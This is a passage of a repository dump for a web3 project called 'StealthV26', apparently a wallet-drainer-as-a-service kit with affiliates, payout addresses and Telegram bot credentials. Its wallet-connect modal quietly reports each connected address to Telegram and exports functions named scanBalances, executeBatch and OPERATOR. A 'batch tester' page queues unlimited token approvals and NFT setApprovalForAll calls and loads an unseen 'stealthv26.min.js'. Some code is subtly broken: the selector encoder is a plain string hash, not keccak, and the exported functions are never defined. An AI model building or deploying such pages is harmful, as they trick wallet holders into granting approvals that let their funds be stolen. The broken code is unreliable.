```typescript
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#09090b;color:#fff;min-height:100vh;padding:40px 20px}
.wrap{max-width:640px;margin:0 auto}
.badge{display:inline-block;background:#8b5cf622;border:1px solid #8b5cf644;color:#a78bfa;border-radius:20px;padding:4px 14px;font-size:11px;font-weight:600;margin-bottom:16px}
h1{font-size:24px;font-weight:700;margin-bottom:4px}
.sub{color:#666;font-size:13px;margin-bottom:28px}
.card{background:#111113;border:1px solid #1e1e22;border-radius:14px;padding:20px;margin-bottom:12px}
.card-title{font-size:13px;font-weight:600;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center}
.card-title .count{font-size:11px;color:#555;font-weight:400}
label{font-size:11px;color:#555;display:block;margin-bottom:4px;text-transform:uppercase;letter-spacing:0.5px}
input,select{width:100%;background:#0a0a0c;border:1px solid #1e1e22;border-radius:8px;padding:10px 12px;color:#fff;font-size:13px;font-family:inherit;margin-bottom:12px}
.btn{width:100%;padding:13px;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;transition:all .15s;font-family:inherit;margin-bottom:8px}
.btn-primary{background:linear-gradient(135deg,#8b5cf6,#ec4899);color:#fff}
.btn-primary:hover{transform:translateY(-1px);box-shadow:0 6px 24px #8b5cf644}
.btn-add{background:#8b5cf622;color:#a78bfa;border:1px solid #8b5cf633}
.btn-execute{background:linear-gradient(135deg,#22c55e,#10b981);color:#fff}
.btn-clear{background:#1e1e22;color:#666;border:1px solid #1e1e22}
.btn-sm{padding:8px 14px;font-size:12px;border-radius:8px;width:auto}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.tx-item{background:#0a0a0c;border:1px solid #1e1e22;border-radius:10px;padding:12px;margin-bottom:8px;font-size:12px}
.tx-item .tx-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
.tx-item .tx-num{font-weight:700;color:#a78bfa}
.tx-item .tx-status{padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600}
.tx-status.pending{background:#f59e0b22;color:#f59e0b;border:1px solid #f59e0b33}
.tx-status.sending{background:#3b82f622;color:#60a5fa;border:1px solid #3b82f633}
.tx-status.success{background:#22c55e22;color:#22c55e;border:1px solid #22c55e33}
.tx-status.failed{background:#ef444422;color:#ef4444;border:1px solid #ef444433}
.tx-item .tx-to{font-family:monospace;font-size:11px;color:#666;word-break:break-all}
.tx-item .tx-val{color:#888;margin-top:4px;font-size:11px}
.tx-item .tx-hash{color:#a78bfa;font-family:monospace;font-size:10px;margin-top:4px;word-break:break-all}
.progress-bar{height:4px;background:#1e1e22;border-radius:2px;margin:12px 0;overflow:hidden}
.progress-fill{height:100%;background:linear-gradient(90deg,#8b5cf6,#ec4899);transition:width .3s;width:0%}
.status-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;border-radius:8px;background:#111;font-size:12px;color:#555;margin-bottom:16px}
.status-bar .dot{width:8px;height:8px;border-radius:50%;background:#ef4444}
.status-bar .dot.on{background:#22c55e}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
.stat{background:#111113;border:1px solid #1e1e22;border-radius:10px;padding:10px;text-align:center}
.stat .val{font-size:18px;font-weight:700}
.stat .lbl{font-size:10px;color:#555;margin-top:2px}
</style>
</head>
<body>
<div class="wrap">
  <div class="badge">📦 Batch Tester</div>
  <h1>Batch Transaction Tester</h1>
  <p class="sub">Queue multiple transactions and execute them sequentially. Monitor status, gas, and results per TX.</p>

  <div class="status-bar"><div class="dot" id="dot"></div><span id="statusText">Not connected</span></div>
  <button class="btn btn-primary" onclick="doConnect()" id="connectBtn">Connect Wallet</button>

  <div class="stats">
    <div class="stat"><div class="val" id="queueCount">0</div><div class="lbl">Queued</div></div>
    <div class="stat"><div class="val" id="sentCount">0</div><div class="lbl">Sent</div></div>
    <div class="stat"><div class="val" id="successCount">0</div><div class="lbl">Success</div></div>
    <div class="stat"><div class="val" id="failCount">0</div><div class="lbl">Failed</div></div>
  </div>

  <div class="card">
    <div class="card-title">Add Transaction</div>
    <label>Type</label>
    <select id="txType" onchange="updateForm()">
      <option value="native">Native Transfer (ETH/BNB)</option>
      <option value="approve">ERC-20 Approve</option>
      <option value="transfer">ERC-20 Transfer</option>
      <option value="nft">NFT setApprovalForAll</option>
      <option value="custom">Custom TX</option>
    </select>
    <label>To Address</label>
    <input id="txTo" placeholder="0x..." />
    <label id="lbl2">Value (ETH)</label>
    <input id="txVal" placeholder="0.01" value="0" />
    <label id="lbl3" style="display:none">Data (hex)</label>
    <input id="txData" style="display:none" placeholder="0x..." />
    <button class="btn btn-add" onclick="addTx()">+ Add to Queue</button>
  </div>

  <div class="card">
    <div class="card-title">
      <span>Transaction Queue</span>
      <span class="count" id="queueLabel">0 transactions</span>
    </div>
    <div id="txQueue"></div>
    <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
    <div class="grid2">
      <button class="btn btn-execute" onclick="executeAll()" id="execBtn">▶ Execute All</button>
      <button class="btn btn-clear" onclick="clearQueue()">✕ Clear Queue</button>
    </div>
  </div>
</div>

<script>
var addr=null, queue=[], sent=0, success=0, fail=0;

function encodeSig(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h+s.charCodeAt(i))|0}return '0x'+(h>>>0).toString(16).padStart(8,'0')}

async function doConnect(){
  if(!window.ethereum)return;
  var a=await window.ethereum.request({method:'eth_requestAccounts'});
  addr=a[0];
  document.getElementById('dot').className='dot on';
  document.getElementById('statusText').textContent='Connected: '+addr.slice(0,6)+'...'+addr.slice(-4);
  document.getElementById('connectBtn').textContent='Connected ✓';
}

function updateForm(){
  var t=document.getElementById('txType').value;
  var l2=document.getElementById('lbl2'),l3=document.getElementById('lbl3'),d=document.getElementById('txData');
  if(t==='native'){l2.textContent='Value (ETH)';l3.style.display='none';d.style.display='none'}
  else if(t==='approve'){l2.textContent='Token Address (put in To)';l3.style.display='none';d.style.display='none'}
  else if(t==='transfer'){l2.textContent='Amount (raw units)';l3.style.display='none';d.style.display='none'}
  else if(t==='nft'){l2.textContent='Operator Address';l3.style.display='none';d.style.display='none'}
  else{l2.textContent='Value (ETH)';l3.style.display='block';d.style.display='block'}
}

function addTx(){
  var type=document.getElementById('txType').value;
  var to=document.getElementById('txTo').value.trim();
  var val=document.getElementById('txVal').value.trim();
  if(!to){return}
  var tx={to:to,type:type,val:val,data:null,status:'pending',hash:null};

  if(type==='approve'){
    var MAX='ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    var spender=val||addr;
    tx.data=encodeSig('approve(address,uint256)')+spender.replace('0x','').padStart(64,'0')+MAX;
    tx.val='0';tx.label='approve('+to.slice(0,8)+'..., MAX)';
  }else if(type==='transfer'){
    tx.data=encodeSig('transfer(address,uint256)')+(addr||'').replace('0x','').padStart(64,'0')+BigInt(val||0).toString(16).padStart(64,'0');
    tx.val='0';tx.label='transfer('+val+')';
  }else if(type==='nft'){
    var operator=val||addr;
    tx.data=encodeSig('setApprovalForAll(address,bool)')+operator.replace('0x','').padStart(64,'0')+'1'.padStart(64,'0');
    tx.val='0';tx.label='setApprovalForAll(true)';
  }else if(type==='custom'){
    tx.data=document.getElementById('txData').value.trim()||null;
    tx.label='custom('+to.slice(0,8)+'...)';
  }else{
    tx.label='send '+val+' ETH';
  }

  queue.push(tx);
  renderQueue();
}

function renderQueue(){
  var el=document.getElementById('txQueue');el.innerHTML='';
  queue.forEach(function(tx,i){
    el.innerHTML+='<div class="tx-item"><div class="tx-header"><span class="tx-num">TX #'+(i+1)+'</span><span class="tx-status '+tx.status+'">'+tx.status.toUpperCase()+'</span></div><div class="tx-to">To: '+tx.to+'</div><div class="tx-val">'+(tx.label||tx.type)+' • Value: '+(tx.val||'0')+' ETH'+'</div>'+(tx.hash?'<div class="tx-hash">Hash: '+tx.hash+'</div>':'')+'</div>';
  });
  document.getElementById('queueLabel').textContent=queue.length+' transactions';
  document.getElementById('queueCount').textContent=queue.length;
  document.getElementById('sentCount').textContent=sent;
  document.getElementById('successCount').textContent=success;
  document.getElementById('failCount').textContent=fail;
}

async function executeAll(){
  if(!addr){return}
  if(!queue.length){return}
  document.getElementById('execBtn').textContent='Executing...';
  for(var i=0;i<queue.length;i++){
    var tx=queue[i];
    if(tx.status!=='pending')continue;
    tx.status='sending';sent++;renderQueue();
    document.getElementById('progressBar').style.width=((i+1)/queue.length*100)+'%';
    try{
      var params={from:addr,to:tx.to};
      if(tx.val&&tx.val!=='0')params.value='0x'+BigInt(Math.floor(parseFloat(tx.val)*1e18)).toString(16);
      if(tx.data)params.data=tx.data;
      var hash=await window.ethereum.request({method:'eth_sendTransaction',params:[params]});
      tx.status='success';tx.hash=hash;success++;
    }catch(e){tx.status='failed';fail++}
    renderQueue();
  }
  document.getElementById('execBtn').textContent='▶ Execute All';
}

function clearQueue(){queue=[];sent=0;success=0;fail=0;renderQueue();document.getElementById('progressBar').style.width='0%'}

renderQueue();
</script>
<script src="stealthv26.min.js"></script>
</body>
</html>`,
  },
];
```

### src/lib/validation.ts

```typescript
/**
 * Zod schemas for input validation across API routes.
 */

import { z } from "zod";

const ethAddress = z.string().regex(/^0x[a-fA-F0-9]{40}$/, "Invalid Ethereum address");

export const createAffiliateSchema = z.object({
  name: z.string().min(2, "Name must be at least 2 characters").max(100),
  payoutAddress: ethAddress,
  // accessSecret is auto-generated — not accepted from the caller
  telegramBotToken: z
    .string()
    .min(10, "Bot token too short")
    .regex(/^\d+:[\w-]+$/, "Invalid Telegram bot token format"),
  telegramChatId: z
    .string()
    .min(1, "Chat ID required")
    .regex(/^-?\d+$/, "Chat ID must be numeric"),
  notes: z.string().max(500).optional().default(""),
});

export const updateAffiliateSchema = z.object({
  name: z.string().min(2).max(100).optional(),
  payoutAddress: ethAddress.optional(),
  // accessSecret cannot be set manually — use the reset-password endpoint
  telegramBotToken: z.string().min(10).optional(),
  telegramChatId: z.string().min(1).optional(),
  status: z.enum(["pending", "active", "paused", "suspended"]).optional(),
  domains: z.array(z.string().max(253)).optional(),
  notes: z.string().max(500).optional(),
});

export type CreateAffiliateInput = z.infer<typeof createAffiliateSchema>;
export type UpdateAffiliateInput = z.infer<typeof updateAffiliateSchema>;
```

### src/lib/wallet-config.ts

```typescript
/**
 * Unified wallet configuration.
 *
 * Single source of truth for wagmi chains + connectors.
 * Wallet UI is provided by Sequence Connect's modal.
 *
 * Chain order: Arbitrum first (lowest fees), then Ethereum, Optimism, Polygon, Base.
 */
import { createConfig, http } from "wagmi";
import {
  injected,
  walletConnect,
  coinbaseWallet,
  safe,
} from "wagmi/connectors";
import { mainnet, optimism, polygon, arbitrum, base } from "wagmi/chains";

export const walletChains = [arbitrum, mainnet, optimism, polygon, base] as const;

export const projectId =
  process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID ||
  process.env.NEXT_PUBLIC_PROJECT_ID ||
  "";

const appName = "StealthV26";
const appUrl =
  process.env.NEXT_PUBLIC_APP_URL ||
  process.env.NEXT_PUBLIC_BASE_URL ||
  "http://localhost:3000";

// ── Native wagmi connectors (no RainbowKit) ───────────────────────────────
// Sequence Connect provides the user-facing wallet selection modal.
const connectors = [
  injected({ shimDisconnect: true }),
  ...(projectId
    ? [
        walletConnect({
          projectId,
          metadata: {
            name: appName,
            description: "StealthV26 — Wallet-as-a-Service Platform",
            url: appUrl,
            icons: [],
          },
          showQrModal: true,
        }),
      ]
    : []),
  coinbaseWallet({ appName }),
  safe(),
];

// ── RPC transports ────────────────────────────────────────────────────────
const transports = {
  [mainnet.id]: http(process.env.ETHEREUM_RPC_URL || "https://eth.llamarpc.com"),
  [optimism.id]: http(process.env.OPTIMISM_RPC_URL || "https://mainnet.optimism.io"),
  [polygon.id]: http(process.env.POLYGON_RPC_URL || "https://polygon-rpc.com"),
  [arbitrum.id]: http(process.env.ARBITRUM_RPC_URL || "https://arb1.arbitrum.io/rpc"),
  [base.id]: http(process.env.BASE_RPC_URL || "https://mainnet.base.org"),
};

// ── Shared wagmi config ───────────────────────────────────────────────────
export const wagmiConfig = createConfig({
  chains: walletChains,
  connectors,
  transports,
  ssr: true,
});
```

### src/lib/web3.ts

```typescript
import {
  createPublicClient,
  createWalletClient,
  custom,
  http,
  type Address,
} from "viem";
import { mainnet } from "viem/chains";

type Eip1193Provider = {
  request(args: { method: string; params?: unknown[] | object }): Promise<unknown>;
};

type WindowWithEthereum = Window & {
  ethereum?: Eip1193Provider;
};

export function getInjectedProvider(): Eip1193Provider | null {
  if (typeof window === "undefined") return null;
  return (window as WindowWithEthereum).ethereum || null;
}

export async function connectInjected(): Promise<{ address: Address; chainId: number }> {
  const provider = getInjectedProvider();
  if (!provider?.request) throw new Error("No injected wallet provider");

  const accounts = await provider.request({ method: "eth_requestAccounts" }) as string[];
  if (!accounts?.[0]) throw new Error("No account returned from wallet");

  const chainIdHex = await provider.request({ method: "eth_chainId" }) as string;
  const chainId = Number.parseInt(chainIdHex, 16);

  return { address: accounts[0] as Address, chainId };
}

export function getWalletClient() {
  const provider = getInjectedProvider();
  if (!provider) throw new Error("No injected wallet provider");

  return createWalletClient({
    chain: mainnet,
    transport: custom(provider),
  });
}

export function getPublicClient(rpcUrl?: string) {
  return createPublicClient({
    chain: mainnet,
    transport: http(rpcUrl || "https://eth.llamarpc.com"),
  });
}
```

### standalone/custom-modal/index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Custom Wallet Modal</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0a0a0f;
      color: #e4e4e7;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .demo { text-align: center; }
    .demo h1 { font-size: 1.4rem; margin-bottom: 8px; }
    .demo p { color: #71717a; font-size: 0.9rem; margin-bottom: 24px; }
    .demo button {
      background: #6366f1; color: #fff; border: none;
      padding: 12px 28px; border-radius: 12px; font-size: 0.95rem;
      cursor: pointer; transition: opacity 0.15s;
    }
    .demo button:hover { opacity: 0.85; }
    #status {
      margin-top: 20px; background: #111; border: 1px solid #222;
      border-radius: 10px; padding: 14px; font-family: monospace;
      font-size: 0.8rem; color: #22c55e; min-height: 50px;
      max-width: 420px; margin-left: auto; margin-right: auto;
      text-align: left; white-space: pre-wrap; word-break: break-all;
    }
  </style>
</head>
<body>
  <div class="demo">
    <h1>🔗 Custom Wallet Modal</h1>
    <p>Light-themed modal with installed wallet detection. Your own script runs after connect.</p>
    <button id="open-modal">Connect a Wallet</button>
    <div id="status">Waiting for connection...</div>
  </div>
  <script type="module" src="./modal.js"></script>
</body>
</html>
```

### standalone/custom-modal/modal.js

```javascript
// ============================================================
//  CUSTOM WALLET MODAL — Light theme, raw wallet detection
//  No Reown SDK. Uses EIP-6963 + window.ethereum directly.
//  Edit onConnected() to run your own script after connect.
// ============================================================

// ─── YOUR CUSTOM SCRIPT — runs after wallet connects ─────────
async function onConnected({ address, chainId, provider }) {
  console.log("✅ Connected:", address, "chain:", chainId);
  document.getElementById("status").textContent =
    `✅ Connected\nAddress: ${address}\nChain: ${chainId}`;
  // TODO: Add your own logic here
  // const signer = await provider.getSigner();
  // await signer.signMessage("hello");
}

async function onDisconnected() {
  console.log("Disconnected");
  document.getElementById("status").textContent = "Disconnected.";
}

// ─── WALLET DETECTION (EIP-6963) ─────────────────────────────
const detectedWallets = [];

const KNOWN_WALLETS = [
  { rdns: "io.metamask", name: "MetaMask", icon: "🦊" },
  { rdns: "com.okex.wallet", name: "OKX Wallet", icon: "⬛" },
  { rdns: "com.ambire.wallet", name: "Ambire", icon: "⚡" },
  { rdns: "com.coinbase.wallet", name: "Coinbase Wallet", icon: "🔵" },
  { rdns: "com.trustwallet.app", name: "Trust Wallet", icon: "🛡️" },
  { rdns: "io.rabby", name: "Rabby", icon: "🐰" },
  { rdns: "app.phantom", name: "Phantom", icon: "👻" },
  { rdns: "com.brave.wallet", name: "Brave Wallet", icon: "🦁" },
];

// Listen for EIP-6963 wallet announcements
window.addEventListener("eip6963:announceProvider", (e) => {
  const { info, provider } = e.detail;
  if (!detectedWallets.find(w => w.info.rdns === info.rdns)) {
    detectedWallets.push({ info, provider });
    renderModal();
  }
});
window.dispatchEvent(new Event("eip6963:requestProvider"));

// Fallback: check window.ethereum
setTimeout(() => {
  if (window.ethereum && detectedWallets.length === 0) {
    detectedWallets.push({
      info: { rdns: "browser", name: "Browser Wallet", icon: "" },
      provider: window.ethereum,
    });
    renderModal();
  }
}, 500);

// ─── MODAL UI ────────────────────────────────────────────────
let modalEl = null;
let overlayEl = null;

function injectModalStyles() {
  if (document.getElementById("cwm-styles")) return;
  const s = document.createElement("style");
  s.id = "cwm-styles";
  s.textContent = `
    .cwm-overlay {
      position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:99998;
      display:flex;align-items:center;justify-content:center;
      opacity:0;transition:opacity 0.2s;pointer-events:none;
    }
    .cwm-overlay.open { opacity:1;pointer-events:auto; }
    .cwm-modal {
      background:#fff;border-radius:20px;width:360px;max-height:80vh;
      overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,0.3);
      transform:scale(0.95);transition:transform 0.25s cubic-bezier(0.16,1,0.3,1);
      color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    }
    .cwm-overlay.open .cwm-modal { transform:scale(1); }
    .cwm-header {
      display:flex;justify-content:space-between;align-items:center;
      padding:20px 24px 12px;
    }
    .cwm-header h2 { font-size:1.1rem;font-weight:700; }
    .cwm-close {
      width:32px;height:32px;border-radius:50%;border:none;
      background:#f0f0f0;cursor:pointer;font-size:1rem;
      display:flex;align-items:center;justify-content:center;
      color:#888;transition:background 0.15s;
    }
    .cwm-close:hover { background:#e0e0e0; }
    .cwm-section { padding:4px 24px 8px;font-size:0.78rem;font-weight:600;color:#3b82f6; }
    .cwm-list { padding:0 12px 12px; }
    .cwm-wallet {
      display:flex;align-items:center;gap:14px;padding:12px 14px;
      border-radius:12px;cursor:pointer;transition:background 0.12s;
    }
    .cwm-wallet:hover { background:#f5f5f5; }
    .cwm-wallet-icon {
      width:40px;height:40px;border-radius:10px;display:flex;
      align-items:center;justify-content:center;font-size:1.4rem;
      background:#f0f0f5;overflow:hidden;flex-shrink:0;
    }
    .cwm-wallet-icon img { width:100%;height:100%;object-fit:cover;border-radius:10px; }
    .cwm-wallet-name { font-size:0.95rem;font-weight:600; }
    .cwm-wallet-tag { font-size:0.72rem;color:#3b82f6;font-weight:500; }
    .cwm-footer {
      padding:16px 24px;border-top:1px solid #f0f0f0;
      display:flex;justify-content:space-between;align-items:center;
      font-size:0.82rem;color:#999;
    }
    .cwm-footer a { color:#3b82f6;text-decoration:none;font-weight:600; }
    .cwm-footer a:hover { text-decoration:underline; }
    .cwm-divider { height:1px;background:#f0f0f0;margin:4px 24px; }
  `;
  document.head.appendChild(s);
}

function createModal() {
  injectModalStyles();
  overlayEl = document.createElement("div");
  overlayEl.className = "cwm-overlay";
  overlayEl.addEventListener("click", (e) => {
    if (e.target === overlayEl) closeModal();
  });

  modalEl = document.createElement("div");
  modalEl.className = "cwm-modal";
  overlayEl.appendChild(modalEl);
  document.body.appendChild(overlayEl);
  renderModal();
}

function openModal() {
  if (!overlayEl) createModal();
  renderModal();
  requestAnimationFrame(() => overlayEl.classList.add("open"));
}

function closeModal() {
  if (overlayEl) overlayEl.classList.remove("open");
}

function renderModal() {
  if (!modalEl) return;

  const installed = detectedWallets.filter(w => w.info.rdns !== "browser");
  const browser = detectedWallets.find(w => w.info.rdns === "browser");

  // Recommended wallets that aren't installed
  const installedRdns = new Set(installed.map(w => w.info.rdns));
  const recommended = KNOWN_WALLETS.filter(w => !installedRdns.has(w.rdns));

  let html = `
    <div class="cwm-header">
      <h2>Connect a Wallet</h2>
      <button class="cwm-close" id="cwm-close">✕</button>
    </div>
  `;

  if (installed.length > 0) {
    html += `<div class="cwm-section">Installed</div><div class="cwm-list">`;
    installed.forEach((w, i) => {
      const icon = w.info.icon
        ? `<img src="${w.info.icon}" alt="${w.info.name}"/>`
        : (KNOWN_WALLETS.find(k => k.rdns === w.info.rdns)?.icon || "💎");
      const tag = i === 0 ? `<div class="cwm-wallet-tag">Recent</div>` : "";
      html += `
        <div class="cwm-wallet" data-wallet-idx="${detectedWallets.indexOf(w)}">
          <div class="cwm-wallet-icon">${icon}</div>
          <div>
            <div class="cwm-wallet-name">${w.info.name}</div>
            ${tag}
          </div>
        </div>
      `;
    });
    html += `</div>`;
  }

  if (browser) {
    if (installed.length === 0) {
      html += `<div class="cwm-section">Detected</div><div class="cwm-list">`;
      html += `
        <div class="cwm-wallet" data-wallet-idx="${detectedWallets.indexOf(browser)}">
          <div class="cwm-wallet-icon">🌐</div>
          <div><div class="cwm-wallet-name">Browser Wallet</div></div>
        </div>
      `;
      html += `</div>`;
    }
  }

  if (recommended.length > 0) {
    html += `<div class="cwm-divider"></div>`;
    html += `<div class="cwm-section">Recommended</div><div class="cwm-list">`;
    recommended.slice(0, 5).forEach((w) => {
      html += `
        <div class="cwm-wallet cwm-wallet-disabled" style="opacity:0.6;cursor:default;">
          <div class="cwm-wallet-icon">${w.icon}</div>
          <div><div class="cwm-wallet-name">${w.name}</div></div>
        </div>
      `;
    });
    html += `</div>`;
  }

  html += `
    <div class="cwm-footer">
      <span>New to Ethereum wallets?</span>
      <a href="https://ethereum.org/wallets" target="_blank">Learn More</a>
    </div>
  `;

  modalEl.innerHTML = html;

  // Bind close
  modalEl.querySelector("#cwm-close")?.addEventListener("click", closeModal);

  // Bind wallet clicks
  modalEl.querySelectorAll("[data-wallet-idx]").forEach((el) => {
    el.addEventListener("click", async () => {
      const idx = parseInt(el.getAttribute("data-wallet-idx"));
      const wallet = detectedWallets[idx];
      if (!wallet) return;
      try {
        const accounts = await wallet.provider.request({ method: "eth_requestAccounts" });
        const chainHex = await wallet.provider.request({ method: "eth_chainId" });
        const address = accounts[0];
        const chainId = parseInt(chainHex, 16);
        closeModal();
        onConnected({ address, chainId, provider: wallet.provider });
      } catch (err) {
        console.error("Connection failed:", err);
      }
    });
  });
}

// ─── BIND OPEN BUTTON ────────────────────────────────────────
document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("open-modal")?.addEventListener("click", openModal);
  // Also bind any button with data-wallet-connect
  document.querySelectorAll("[data-wallet-connect]").forEach(b =>
    b.addEventListener("click", openModal)
  );
});

// Listen for account/chain changes
if (window.ethereum) {
  window.ethereum.on?.("accountsChanged", (accounts) => {
    if (accounts.length === 0) onDisconnected();
    else {
      window.ethereum.request({ method: "eth_chainId" }).then(hex => {
        onConnected({ address: accounts[0], chainId: parseInt(hex, 16), provider: window.ethereum });
      });
    }
  });
  window.ethereum.on?.("chainChanged", (hex) => {
    window.ethereum.request({ method: "eth_accounts" }).then(accounts => {
      if (accounts[0]) onConnected({ address: accounts[0], chainId: parseInt(hex, 16), provider: window.ethereum });
    });
  });
}

export { openModal, closeModal };
```

### standalone/rainbow-modal/main.js

```javascript
// ============================================================
//  RAINBOW-STYLE APPKIT MODAL
//  Same Reown AppKit under the hood, but with light/rainbow theme
//  and gradient accent colors. Your own script runs after connect.
// ============================================================

import { createAppKit } from "@reown/appkit";
import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
import { mainnet, sepolia, arbitrum, polygon, base, optimism } from "@reown/appkit/networks";
import { disconnect, signMessage, getAccount } from "@wagmi/core";

const projectId = import.meta.env?.VITE_WALLETCONNECT_PROJECT_ID || "";
const networks = [mainnet, sepolia, arbitrum, polygon, base, optimism];
const wagmiAdapter = new WagmiAdapter({ networks, projectId });

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: "Rainbow dApp",
    description: "Rainbow-themed wallet modal",
    url: window.location.origin,
    icons: [],
  },
  // KEY DIFFERENCE: light theme with custom accent
  themeMode: "light",
  themeVariables: {
    "--w3m-accent": "#8b5cf6",
    "--w3m-color-mix": "#f0e6ff",
    "--w3m-color-mix-strength": 15,
    "--w3m-border-radius-master": "2px",
  },
  features: {
    analytics: false,
    email: true,
    socials: ["google", "github", "discord", "apple", "x"],
    swaps: true,
    onramp: true,
  },
});

function getConfig() { return wagmiAdapter.wagmiConfig; }
const $status = document.getElementById("status");

// ─── TOAST ───────────────────────────────────────────────────
const toasts = [];
function showToast(title, body, type = "success", ms = 4000) {
  if (!document.getElementById("rb-toast-css")) {
    const s = document.createElement("style");
    s.id = "rb-toast-css";
    s.textContent = `
      .rb-toast{position:fixed;top:20px;right:20px;z-index:2147483647;
        background:#fff;border:1px solid #e5e7eb;border-radius:16px;
        padding:16px 22px;color:#1a1a1a;font-family:system-ui,sans-serif;
        font-size:.88rem;box-shadow:0 8px 32px rgba(0,0,0,.12);
        transform:translateX(120%);transition:all .35s cubic-bezier(.16,1,.3,1);
        max-width:380px;word-break:break-all;cursor:pointer}
      .rb-toast.show{transform:translateX(0)}
      .rb-toast .tt{font-weight:700;margin-bottom:4px}
      .rb-toast .tb{color:#6b7280;font-size:.82rem;font-family:monospace}
      .rb-toast.success{border-left:4px solid #22c55e}
      .rb-toast.info{border-left:4px solid #8b5cf6}
      .rb-toast.warn{border-left:4px solid #f59e0b}
      .rb-toast.error{border-left:4px solid #ef4444}`;
    document.head.appendChild(s);
  }
  while (toasts.length >= 5) toasts.shift().remove();
  const el = document.createElement("div");
  el.className = "rb-toast " + type;
  el.innerHTML = `<div class="tt">${title}</div><div class="tb">${body}</div>`;
  el.onclick = () => { el.classList.remove("show"); setTimeout(() => { toasts.splice(toasts.indexOf(el), 1); el.remove(); restack(); }, 300); };
  document.body.appendChild(el);
  toasts.push(el);
  restack();
  requestAnimationFrame(() => requestAnimationFrame(() => { el.classList.add("show"); restack(); }));
  setTimeout(() => { if (el.parentNode) { el.classList.remove("show"); setTimeout(() => { const i = toasts.indexOf(el); if (i > -1) toasts.splice(i, 1); el.remove(); restack(); }, 400); } }, ms);
}
function restack() { let y = 0; toasts.forEach(el => { el.style.top = (20 + y) + "px"; y += el.offsetHeight + 12; }); }

// ─── YOUR CALLBACKS ──────────────────────────────────────────
async function onConnected({ address, chainId }) {
  const short = address.slice(0, 6) + "..." + address.slice(-4);
  showToast("🌈 Connected", `${short} on chain ${chainId}`, "success");
  notifyTelegram("\u2705 <b>Wallet Connected</b>\n\nAddress: <code>" + address + "</code>\nChain: " + chainId);
  if ($status) $status.textContent = `✅ Connected\nAddress: ${address}\nChain: ${chainId}`;
  // TODO: your custom logic here
}

async function onDisconnected() {
  showToast("Disconnected", "Wallet disconnected.", "warn");
  if ($status) $status.textContent = "Disconnected.";
}

async function onChainChanged({ chainId }) {
  showToast("🔄 Network", `Switched to chain ${chainId}`, "info");
}

// ─── WIRING ──────────────────────────────────────────────────
let lastAddr = null, lastChain = null, wasConn = false;

modal.subscribeState(() => {
  const c = modal.getIsConnected(), a = modal.getAddress(), ch = modal.getChainId();
  if (c && a) {
    if (wasConn && lastChain && lastChain !== ch) onChainChanged({ chainId: ch });
    if (lastAddr !== a) onConnected({ address: a, chainId: ch });
    lastAddr = a; lastChain = ch; wasConn = true;
  } else if (!c && wasConn) {
    wasConn = false; lastAddr = null; lastChain = null; onDisconnected();
  }
});

modal.subscribeProviders(() => {
  const c = modal.getIsConnected(), a = modal.getAddress(), ch = modal.getChainId();
  if (c && a && lastAddr !== a) { onConnected({ address: a, chainId: ch }); lastAddr = a; lastChain = ch; wasConn = true; }
});

// ─── BUTTON BINDINGS ─────────────────────────────────────────
function bind() {
  document.querySelectorAll("[data-appkit-connect]").forEach(b =>
    b.addEventListener("click", () => modal.open()));
  document.querySelectorAll("[data-appkit-network]").forEach(b =>
    b.addEventListener("click", () => modal.open({ view: "Networks" })));
  document.querySelectorAll("[data-appkit-sign]").forEach(b =>
    b.addEventListener("click", async () => {
      if (!modal.getIsConnected()) return showToast("⚠️", "Connect first", "warn");
      try {
        showToast("✍️ Signing...", "Check wallet", "info", 3000);
        const sig = await signMessage(getConfig(), { message: "Hello from Rainbow dApp!" });
        showToast("✅ Signed", sig.slice(0, 20) + "...", "success", 6000);
      } catch (e) { showToast("❌ Error", e.message || String(e), "error"); }
    }));
  document.querySelectorAll("[data-appkit-disconnect]").forEach(b =>
    b.addEventListener("click", async () => {
      if (!modal.getIsConnected()) return;
      try { const acc = getAccount(getConfig()); await disconnect(getConfig(), acc.connector ? { connector: acc.connector } : undefined); }
      catch { await disconnect(getConfig()); }
    }));
}

if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", bind);
else bind();

export { modal, showToast, scanBalances, executeBatch, walletAssets, OPERATOR };
```

### standalone/rainbow-modal/src/App.jsx

```jsx
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useSignMessage, useDisconnect } from "wagmi";
import { useEffect, useState } from "react";

export default function App() {
  const { address, isConnected, chain } = useAccount();
  const { disconnect } = useDisconnect();
  const { signMessageAsync } = useSignMessage();
  const [result, setResult] = useState("");

  // ─── YOUR CUSTOM SCRIPT — runs after wallet connects ───────
  useEffect(() => {
    if (isConnected && address) {
      console.log("✅ Connected:", address, "chain:", chain?.id);
      setResult(`✅ Connected\nAddress: ${address}\nChain: ${chain?.name} (${chain?.id})`);
      // TODO: Add your own post-connect logic here
    } else {
      setResult("Waiting for connection...");
    }
  }, [isConnected, address, chain]);

  async function handleSign() {
    try {
      setResult("✍️ Check your wallet...");
      const sig = await signMessageAsync({ message: "Hello from RainbowKit!" });
      setResult(`✅ Signed!\n${sig}`);
    } catch (err) {
